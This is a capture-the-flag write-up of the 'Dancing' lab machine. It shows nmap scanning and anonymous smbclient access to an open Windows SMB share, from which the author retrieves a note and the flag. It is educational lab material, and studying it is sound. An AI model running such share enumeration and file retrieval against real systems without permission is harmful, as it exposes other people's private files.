---
Name: Dancing
OS: Windows
Difficulty: very easy
Date: May 1st 2023
Tags: SMB
---

## Description
The third machine of the Starting Point Tier 0. This time a Windows system hosting an SMB share.

## Enumeration
Let's start with a simple Nmap scan to determine what ports are open on the target machine.
```
$ nmap -F --reason -sV $ip

PORT    STATE SERVICE       REASON  VERSION
135/tcp open  msrpc         syn-ack Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds? syn-ack
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
In this case multiple ports are open, by looking at them one can determine that the target machine runs on Windows. Clearly, the most interesting service open on the target system is the SMB port of `445`. An SMB client can be used to list SMB shares on the remote system.
```
$ smbclient -L $ip

Enter WORKGROUP\b4rt00's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```
Besides standard shares ther is also one called `WorkShares` which looks interesting. Let's use `smbclient` to connect to it and view its contents.
```
$ smbclient \\\\$ip\\WorkShares
Enter WORKGROUP\b4rt00's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Mar 29 10:22:01 2021
  ..                                  D        0  Mon Mar 29 10:22:01 2021
  Amy.J                               D        0  Mon Mar 29 11:08:24 2021
  James.P                             D        0  Thu Jun  3 10:38:03 2021

		5114111 blocks of size 4096. 1749019 blocks available
```
There are two available directories which look like personal employee shares.
```
smb: \> cd Amy.J\
smb: \Amy.J\> ls
  .                                   D        0  Mon Mar 29 11:08:24 2021
  ..                                  D        0  Mon Mar 29 11:08:24 2021
  worknotes.txt                       A       94  Fri Mar 26 12:00:37 2021

		5114111 blocks of size 4096. 1749019 blocks available
smb: \Amy.J\> get worknotes.txt 
getting file \Amy.J\worknotes.txt of size 94 as worknotes.txt (0,3 KiloBytes/sec) (average 0,3 KiloBytes/sec)
smb: \Amy.J\> cd ..\James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 10:38:03 2021
  ..                                  D        0  Thu Jun  3 10:38:03 2021
  flag.txt                            A       32  Mon Mar 29 11:26:57 2021

		5114111 blocks of size 4096. 1749024 blocks available
smb: \James.P\> get flag.txt 
getting file \James.P\flag.txt of size 32 as flag.txt (0,1 KiloBytes/sec) (average 0,2 KiloBytes/sec)
smb: \James.P\>
```
One of them contains a file called `worknotes.txt` which is just a note left there by Amy.
The other one is the flag.
```
$ cat worknotes.txt
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing

$ cat flag.txt
[REDACTED]
```

## Summary
This machine demonstrates how a single open SMB share can leak sensitive information to anyone interested enough to look. This is very common in Windows enviroments where SMB is easy to enable and forget, possibly exposing sensitive information.

## Resources
[SMB wikipedia article](https://en.wikipedia.org/wiki/Server_Message_Block)